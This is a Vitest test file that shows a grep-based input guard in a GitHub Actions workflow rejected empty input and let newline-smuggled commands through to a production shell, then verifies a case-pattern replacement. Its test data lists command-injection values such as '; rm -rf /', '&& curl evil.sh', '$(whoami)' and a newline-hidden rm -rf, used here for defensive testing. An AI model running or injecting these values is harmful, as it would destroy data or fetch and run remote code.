/**
 * Phase 14 item 6 — a workflow that cannot run in its own documented mode, and
 * a guard that would have let a newline through to a production shell.
 *
 * `shop-kind.yml` says "empty to list only" and, given empty, failed its own
 * input guard in 12 seconds — twice, on two different days. It was:
 *
 *     if ! printf '%s' "$KINDS" | grep -Eq '^[A-Za-z0-9.=, -]*$'
 *
 * Two faults, both from using grep on a value that is not a line:
 *
 *   1. `printf '%s' ""` writes ZERO BYTES, so grep gets no line, matches
 *      nothing, exits 1 — and `!` turned "nothing to validate" into "invalid".
 *   2. `grep -q` succeeds if ANY line matches, so a value containing a newline
 *      passed on the strength of its first line while the WHOLE value, newline
 *      intact, was interpolated into `sh -c` on the production machine.
 *
 * Both are reproduced below against the real semantics, then the replacement —
 * a `case` pattern, which matches the whole value and has no line concept — is
 * driven through the same inputs.
 */
import { describe, it, expect } from "vitest";
import { readFileSync, readdirSync } from "node:fs";

const WF_DIR = ".github/workflows";
const files = readdirSync(WF_DIR).filter((f) => f.endsWith(".yml"));

/**
 * Workflow source with comment lines removed.
 *
 * 07-VERIFICATION.md: "a source-reading guard must strip comments, or it fires
 * on its own documentation." These files explain the defect they fixed by
 * quoting the old line, and a guard that greps the raw text then reports the
 * explanation as the offence — which is exactly what happened here first.
 */
const code = (src) => src.split("\n").filter((l) => !/^\s*#/.test(l)).join("\n");
const yml = code(readFileSync(`${WF_DIR}/shop-kind.yml`, "utf8"));

const ALLOWED = /[A-Za-z0-9.=, -]/;

/** `printf FMT "$v" | grep -Eq PATTERN` — grep's real, line-based behaviour. */
function oldGuardAccepts(fmt, value) {
  const emitted = fmt === "%s\\n" ? `${value}\n` : value;
  if (emitted === "") return false; // no bytes → no line → grep exits 1
  const lines = emitted.replace(/\n$/, "").split("\n");
  return lines.some((l) => /^[A-Za-z0-9.=, -]*$/.test(l)); // -q: ANY line
}

/** `case "$v" in *[!A-Za-z0-9.=,\ -]*) refuse ;; esac` — whole-value matching. */
function newGuardAccepts(value) {
  return ![...String(value)].some((ch) => !ALLOWED.test(ch));
}

const VALID = [
  "",
  "a.myshopify.com=real",
  "a.myshopify.com=real b.myshopify.com=shopify",
  "a.myshopify.com=ours,b.myshopify.com=unclassified",
];
const HOSTILE = [
  "a.myshopify.com=real; rm -rf /",
  "a.myshopify.com=real && curl evil.sh",
  "$(whoami)",
  "`id`",
  "a.myshopify.com=real|sh",
  'a.myshopify.com="x"',
  "a.myshopify.com=real\nb.myshopify.com=real; rm -rf /", // the one grep let through
];

describe("the two defects, reproduced", () => {
  it("DEFECT 1 — the documented empty input was rejected", () => {
    expect(oldGuardAccepts("%s", "")).toBe(false);
  });

  it("DEFECT 2 — a newline passed, on the strength of its first line", () => {
    expect(oldGuardAccepts("%s", "a.myshopify.com=real\nb.myshopify.com=real; rm -rf /")).toBe(true);
    // and adding the newline to printf — the obvious one-line fix — does not
    // close it, which is why the guard is not a grep any more
    expect(oldGuardAccepts("%s\\n", "a.myshopify.com=real\nb; rm -rf /")).toBe(true);
  });
});

describe("the replacement guard", () => {
  it.each(VALID)("accepts %j", (v) => {
    expect(newGuardAccepts(v)).toBe(true);
  });

  it.each(HOSTILE)("refuses %j", (v) => {
    expect(newGuardAccepts(v)).toBe(false);
  });
});

describe("shop-kind.yml carries it", () => {
  it("still documents empty as list-only, so the empty case is a supported mode", () => {
    expect(yml).toMatch(/empty to list only/);
    expect(yml).toMatch(/required: false/);
  });

  it("validates with a case pattern on the whole value, not with grep on lines", () => {
    expect(yml).toMatch(/case "\$KINDS" in/);
    expect(yml).toMatch(/\*\[!A-Za-z0-9\.=,\\ -\]\*\)/);
    expect(yml).not.toMatch(/printf '%s'? ?\\?n?' "\$KINDS" \| grep/);
  });

  it("and still refuses loudly, with an error the operator can act on", () => {
    expect(yml).toMatch(/::error::kinds may contain only domains/);
    expect(yml).toMatch(/exit 1/);
  });
});

describe("the class — no workflow validates an optional input with grep on lines", () => {
  it("nothing pipes a workflow input into grep", () => {
    const offenders = [];
    for (const f of files) {
      const src = code(readFileSync(`${WF_DIR}/${f}`, "utf8"));
      for (const m of src.matchAll(/printf\s+'[^']*'\s+"\$\{?(\w+)\}?"\s*\|\s*grep/g)) {
        offenders.push(`${f}: $${m[1]} piped into grep`);
      }
    }
    expect(offenders, "grep matches LINES; an input is a value — use a case pattern").toEqual([]);
  });
});
